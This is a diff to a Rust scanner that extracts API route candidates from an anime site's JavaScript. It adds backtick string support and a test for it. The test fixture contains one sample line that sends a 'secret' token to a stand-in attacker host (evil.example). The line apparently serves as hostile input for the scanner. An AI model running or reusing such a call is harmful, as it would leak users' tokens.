@@ -51,7 +51,7 @@ pub fn inspect_animego_script(source: &str) -> Vec<AnimeGoScriptRouteCandidate> 
     let mut cursor = 0usize;
     while cursor < source.len() && found.len() < MAX_CANDIDATES {
         let Some((quote_index, quote)) = source[cursor..].char_indices()
-            .find_map(|(offset, ch)| if ch == '"' || ch == '\'' { Some((cursor + offset, ch)) } else { None })
+            .find_map(|(offset, ch)| if ch == '"' || ch == '\'' || ch == '`' { Some((cursor + offset, ch)) } else { None })
         else { break; };
         let value_start = quote_index + quote.len_utf8();
         let mut escaped = false;
@@ -150,11 +150,13 @@ mod tests {
             body: new URLSearchParams({ token: csrf, status: listType, progress: watched })
           });
           axios.post('/rating/anime/' + id + '/vote', { rate: score });
+          const progressUrl = \`/episode/progress/update\`;
           fetch('https://evil.example/steal?token=secret');
         "#;
         let found = inspect_animego_script(source);
         assert!(found.iter().any(|item| item.path == "/mylist/anime/"));
         assert!(found.iter().any(|item| item.path == "/rating/anime/"));
+        assert!(found.iter().any(|item| item.path == "/episode/progress/update"));
         let list = found.iter().find(|item| item.path == "/mylist/anime/").unwrap();
         assert!(list.methods.contains(&"POST".to_string()));
         assert!(list.capabilities.contains(&"list-membership".to_string()));
